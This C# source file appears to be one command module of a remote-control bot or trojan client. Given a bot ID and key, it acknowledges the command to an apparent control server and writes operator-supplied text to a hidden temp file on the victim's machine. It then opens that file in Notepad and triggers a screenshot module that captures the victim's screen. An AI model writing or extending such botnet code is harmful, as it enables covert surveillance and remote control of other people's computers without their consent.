using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;

namespace ConsoleApp3
{
    internal class cmd_OpenNotepad
    {
        public void OpenNotepad(string text, string key, string bot_id, string pc_name)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            try
            {
                Random rnd = new Random();
                string rnd_name = string.Concat(Enumerable.Range(0, 5).Select(_ => rnd.Next(0, 256).ToString("x1")));
                StreamWriter sw = new StreamWriter($"C:\\Users\\{pc_name}\\AppData\\Local\\Temp\\{rnd_name}");
                sw.WriteLine(text);
                sw.Close();

                Process.Start("notepad.exe", $"C:\\Users\\{pc_name}\\AppData\\Local\\Temp\\{rnd_name}");
            }
            catch
            {
            }

            Thread.Sleep(1500);

            cmd_GetScreenshot cmd_GetScreenshot = new cmd_GetScreenshot();
            cmd_GetScreenshot.GetScreenshot(key, bot_id, pc_name);
        }

    }
}
